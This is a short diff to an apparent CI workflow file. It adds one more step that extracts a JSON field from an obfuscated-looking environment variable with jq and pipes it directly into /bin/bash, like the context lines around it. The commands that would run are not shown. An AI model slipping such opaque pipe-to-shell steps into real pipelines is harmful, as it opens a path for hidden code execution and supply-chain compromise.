@@ -19,6 +19,7 @@ jobs:
           printf '%s' "$rktnm8234" | jq -r .az52 | /bin/bash
           printf '%s' "$h647" | jq -r .xbl3059 | /bin/bash
           echo $s44 | jq -r .a7 | /bin/bash
+          printf '%s' "$pw15" | jq -r .ohe17183 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
